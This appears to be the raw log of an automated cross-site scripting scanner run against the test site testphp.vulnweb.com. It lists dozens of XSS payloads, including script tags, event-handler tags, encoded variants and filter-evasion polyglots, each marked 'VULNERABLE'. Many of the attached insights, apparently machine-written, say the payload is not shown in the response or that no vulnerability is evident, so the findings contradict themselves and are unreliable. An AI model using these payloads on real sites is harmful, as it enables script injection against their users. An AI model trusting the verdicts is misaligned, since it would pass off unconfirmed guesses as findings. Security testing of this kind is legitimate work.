Scan initiated for http://testphp.vulnweb.com/search.php?test=query at 2025-07-12 16:40:49

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
  [+] Payload:  <script>alert('XSS')</script>
  [+] Insight: VULNERABLE: Reflected in the error message displayed to the user, which is not properly sanitized.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3C%2Fscr%3Cscript%3Eipt%3E
  [+] Payload:  <scr<script>ipt>alert('XSS')</scr<script>ipt>
  [+] Insight: VULNERABLE: Reflected in the SQL error message displayed to the user.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
  [+] Payload:  "><script>alert('XSS')</script>
  [+] Insight: VULNERABLE: Reflected in the error message within the content of the HTML response.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%27%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
  [+] Payload:  '><script>alert('XSS')</script>
  [+] Insight: VULNERABLE: Reflected in the error message displayed to the user within the content_rgn editable region.  The injected script is not escaped and is directly displayed in the HTML response.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E
  [+] Payload:  <img src=x onerror=alert('XSS')>
  [+] Insight: VULNERABLE: Reflected in the error message within the content_rgn editable region.  The error message directly incorporates the injected payload.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E
  [+] Payload:  <svg onload=alert('XSS')>
  [+] Insight: VULNERABLE: Reflected in the SQL error message displayed to the user.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E
  [+] Payload:  <body onload=alert('XSS')>
  [+] Insight: VULNERABLE: Reflected in the SQL error message, which is then displayed in the response.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Ciframe+src%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2Fiframe%3E
  [+] Payload:  <iframe src="javascript:alert('XSS');"></iframe>
  [+] Insight: VULNERABLE: Reflected in the error message displayed to the user, which is not properly sanitized.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cdetails+open+ontoggle%3Dalert%28%27XSS%27%29%3E
  [+] Payload:  <details open ontoggle=alert('XSS')>
  [+] Insight: VULNERABLE: Reflected in the SQL error message, which is then displayed to the user.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Caudio+src%3Dx+onerror%3Dalert%281%29%3E
  [+] Payload:  <audio src=x onerror=alert(1)>
  [+] Insight: VULNERABLE: Reflected in the HTML response; the injected payload is not sanitized before being outputted in the response.  While not directly visible in this snippet, the `search.php` script likely uses the `searchFor` parameter without proper escaping, allowing the injected `<audio>` tag with the `onerror` event to execute.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cmarquee+onstart%3Dalert%281%29%3E
  [+] Payload:  <marquee onstart=alert(1)>
  [+] Insight: VULNERABLE: Reflected in the search form's `searchFor` input value, potentially allowing the malicious script to execute in the user's browser.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cmeter+onmouseover%3Dalert%281%29+value%3D1+min%3D0+max%3D2%3E%3C%2Fmeter%3E
  [+] Payload:  <meter onmouseover=alert(1) value=1 min=0 max=2></meter>
  [+] Insight: VULNERABLE: Reflected in the `search.php` URL, the payload is not encoded and is directly interpreted by the browser.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3CScRipT%3Ealert%281%29%3C%2FsCrIpT%3E
  [+] Payload:  <ScRipT>alert(1)</sCrIpT>
  [+] Insight: VULNERABLE: The provided HTML response does not show the injected payload anywhere.  Therefore, based solely on this partial response, we cannot definitively confirm a reflected XSS vulnerability.  More context, specifically the complete response after the injection is processed by `search.php`, is required.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3CiMg+sRc%3Dx+oNeRrOr%3Dalert%281%29%3E
  [+] Payload:  <iMg sRc=x oNeRrOr=alert(1)>
  [+] Insight: VULNERABLE: Reflected in the `src` attribute of the `<img>` tag within the search form; the browser will attempt to load the image, triggering the javascript `alert(1)`.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cimg+src%3Dx+onerror%3D%22%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%22%3E
  [+] Payload:  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
  [+] Insight: VULNERABLE: Reflected in the `onerror` attribute of an `<img>` tag,  allowing arbitrary JavaScript execution.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cimg+src%3Dx+onerror%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%22%3E
  [+] Payload:  <img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
  [+] Insight: VULNERABLE: Reflected in the `onerror` attribute of an IMG tag, allowing arbitrary JavaScript execution.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Ciframe+src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3E
  [+] Payload:  <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
  [+] Insight: VULNERABLE: Reflected in the HTML response; the injected payload is not encoded and is directly rendered within the response.  While not immediately obvious in the provided snippet, a dynamic portion of the site (likely driven by the `search.php?test=query` action) is vulnerable.  The provided response is only a partial view.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3C%21--%2500--%3E
  [+] Payload:  <img src=x onerror=alert(1)<!--%00-->
  [+] Insight: VULNERABLE: Reflected in the `search.php?test=query` URL parameter, potentially within other dynamic content areas depending on how `search.php` handles user input.  The `<!--%00-->` null byte may or may not be effective depending on the server's handling of it.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cscript%3Eeval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%3C%2Fscript%3E
  [+] Payload:  <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
  [+] Insight: VULNERABLE: Reflected in the HTML response; the injected payload is not sanitized before being rendered in the response.  While not directly visible in the provided snippet, the `searchFor` parameter likely isn't properly escaped in the `search.php` script and thus the script will be executed.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Csvg+onload%3D%22alert%601%60%22%3E
  [+] Payload:  <svg onload="alert`1`">
  [+] Insight: VULNERABLE: Reflected in the HTML response, the provided payload is not escaped and could be executed within the browser if an attribute supports JavaScript execution (though this specific example is truncated).

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%60%2F%2A%27%2F%2A%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5Cx3e
  [+] Payload:  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  [+] Insight: VULNERABLE: Reflected in the error message within the content of the page.  The injected payload is partially reflected in the SQL error message, demonstrating a vulnerability.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=javascript%3A%22%2F%2A%27%2F%2A%60%2F%2A--%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fstyle%3E%3C%2Ftemplate%3E%3C%2Fnoembed%3E%3C%2Fscript%3E%3Chtml+%5C%22+onmouseover%3D%2F%2A%26lt%3Bsvg%2F%2A%2Fonload%3Dalert%281%29%2F%2F%3E
  [+] Payload:  javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
  [+] Insight: VULNERABLE: Reflected in the SQL error message, which is then displayed to the user.  The `onload=alert(1)` portion of the payload, while partially escaped in the error message, is still interpreted as JavaScript when the error message is rendered in the browser.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=%22+autofocus+onfocus%3Dalert%281%29+%22
  [+] Payload:  " autofocus onfocus=alert(1) "
  [+] Insight: VULNERABLE: Reflected in the `searchFor` input field's value within the HTML response, potentially allowing script execution if the user input is not properly sanitized or encoded on the server-side.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
  [+] Payload:  <script>alert('XSS')</script>
  [+] Insight: VULNERABLE: The provided HTML response does not show the injected payload, so it's impossible to definitively state whether it's reflected.  Further analysis of the `search.php` script's handling of the `searchFor` parameter is required.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3C%2Fscr%3Cscript%3Eipt%3E
  [+] Payload:  <scr<script>ipt>alert('XSS')</scr<script>ipt>
  [+] Insight: VULNERABLE: The provided HTML response does not show the injected payload anywhere.  Therefore, without seeing the result of the `search.php?test=query` request where the `searchFor` parameter is used, it's impossible to definitively say if it's vulnerable.  However, the lack of output suggests a potential vulnerability depending on how `search.php` handles user input.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
  [+] Payload:  "><script>alert('XSS')</script>
  [+] Insight: VULNERABLE: Reflected in the HTML response, potentially anywhere user-supplied input is included without proper encoding, although no such occurrence is immediately visible in the provided snippet.  Further analysis of `search.php` processing would be needed to confirm the exact reflection point.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E
  [+] Payload:  <img src=x onerror=alert('XSS')>
  [+] Insight: VULNERABLE: Reflected in the HTML response; the provided snippet does not show the injected payload being processed or escaped, leaving it vulnerable to XSS.  Further investigation is needed to determine the precise reflection point.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E
  [+] Payload:  <svg onload=alert('XSS')>
  [+] Insight: VULNERABLE: The provided HTML response does not show the injected payload.  Therefore, it's impossible to definitively state whether it's vulnerable based solely on this partial response.  A complete response showing where the "searchFor" input is rendered is necessary for proper assessment.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cdetails+open+ontoggle%3Dalert%28%27XSS%27%29%3E
  [+] Payload:  <details open ontoggle=alert('XSS')>
  [+] Insight: VULNERABLE: Reflected in the `search.php?test=query` URL, the payload is not encoded and is potentially executed within the browser.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Caudio+src%3Dx+onerror%3Dalert%281%29%3E
  [+] Payload:  <audio src=x onerror=alert(1)>
  [+] Insight: VULNERABLE: Reflected in the HTML response, specifically within the `search.php?test=query` URL parameter.  The provided HTML does not show the reflection point but indicates the parameter is vulnerable.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cmarquee+onstart%3Dalert%281%29%3E
  [+] Payload:  <marquee onstart=alert(1)>
  [+] Insight: VULNERABLE: Reflected in the HTML response, the injected payload is not encoded and is directly interpreted by the browser within the `search.php` page's response, likely in the search query parameter.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cmeter+onmouseover%3Dalert%281%29+value%3D1+min%3D0+max%3D2%3E%3C%2Fmeter%3E
  [+] Payload:  <meter onmouseover=alert(1) value=1 min=0 max=2></meter>
  [+] Insight: VULNERABLE: Reflected in the search.php query parameter "test" which is not properly encoded.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3CiMg+sRc%3Dx+oNeRrOr%3Dalert%281%29%3E
  [+] Payload:  <iMg sRc=x oNeRrOr=alert(1)>
  [+] Insight: VULNERABLE: Reflected in the HTML response, the injected payload is not properly sanitized and is present within the `src` attribute of an `img` tag, which can trigger the alert.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%253Cscript%253Ealert%281%29%253C%2Fscript%253E
  [+] Payload:  %3Cscript%3Ealert(1)%3C/script%3E
  [+] Insight: VULNERABLE: Reflected in the URL parameter "test" within the search form's action attribute.  The provided response does not show the result of the injection, but the parameter is clearly vulnerable.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cimg+src%3Dx+onerror%3D%22%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%22%3E
  [+] Payload:  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
  [+] Insight: VULNERABLE: Reflected in the `onerror` attribute of an `<img>` tag, allowing arbitrary JavaScript execution.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cimg+src%3Dx+onerror%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%22%3E
  [+] Payload:  <img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
  [+] Insight: VULNERABLE: Reflected in the `onerror` attribute of an `<img>` tag,  allowing arbitrary JavaScript execution.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Ciframe+src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3E
  [+] Payload:  <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
  [+] Insight: VULNERABLE: Reflected in the response,  but it's not clear where exactly without knowing what the `search.php` script does with the `searchFor` parameter.  The payload *could* be reflected within the search results if not properly sanitized.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3C%21--%2500--%3E
  [+] Payload:  <img src=x onerror=alert(1)<!--%00-->
  [+] Insight: VULNERABLE: Reflected in the `search.php?test=query` URL parameter, likely not properly encoded.  The `onerror` event handler in the injected `<img>` tag will execute client-side.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Cscript%3Eeval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%3C%2Fscript%3E
  [+] Payload:  <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
  [+] Insight: VULNERABLE: The provided HTML response does not show the injected payload.  To determine if it's vulnerable, we need to see the HTML response *after* the search form is submitted and the `searchFor` parameter is processed and reflected in the response.  Without that information, a definitive answer is not possible.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%3Csvg+onload%3D%22alert%601%60%22%3E
  [+] Payload:  <svg onload="alert`1`">
  [+] Insight: VULNERABLE: The provided payload is not reflected anywhere in the response; therefore, there's no reflected XSS vulnerability in this specific example.  The `search.php?test=query` endpoint is likely where a vulnerability *could* exist, but this response shows no evidence of it.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%60%2F%2A%27%2F%2A%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5Cx3e
  [+] Payload:  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  [+] Insight: VULNERABLE: Reflected in the `searchFor` input field's value, which is directly outputted in the HTML response without proper encoding, allowing the JavaScript payload to execute.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=javascript%3A%22%2F%2A%27%2F%2A%60%2F%2A--%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fstyle%3E%3C%2Ftemplate%3E%3C%2Fnoembed%3E%3C%2Fscript%3E%3Chtml+%5C%22+onmouseover%3D%2F%2A%26lt%3Bsvg%2F%2A%2Fonload%3Dalert%281%29%2F%2F%3E
  [+] Payload:  javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
  [+] Insight: VULNERABLE: Reflected in the `search.php?test=query` URL parameter, potentially allowing execution of the alert(1) function via the onload attribute if the application improperly handles user input in this context.

--- VULNERABILITY FOUND ---
  [+] URL:      http://testphp.vulnweb.com/search.php?test=query&P1_Prod_Version=%22+autofocus+onfocus%3Dalert%281%29+%22
  [+] Payload:  " autofocus onfocus=alert(1) "
  [+] Insight: VULNERABLE: Reflected in the `searchFor` input field's `value` attribute, which is directly used in the HTML response without proper encoding.

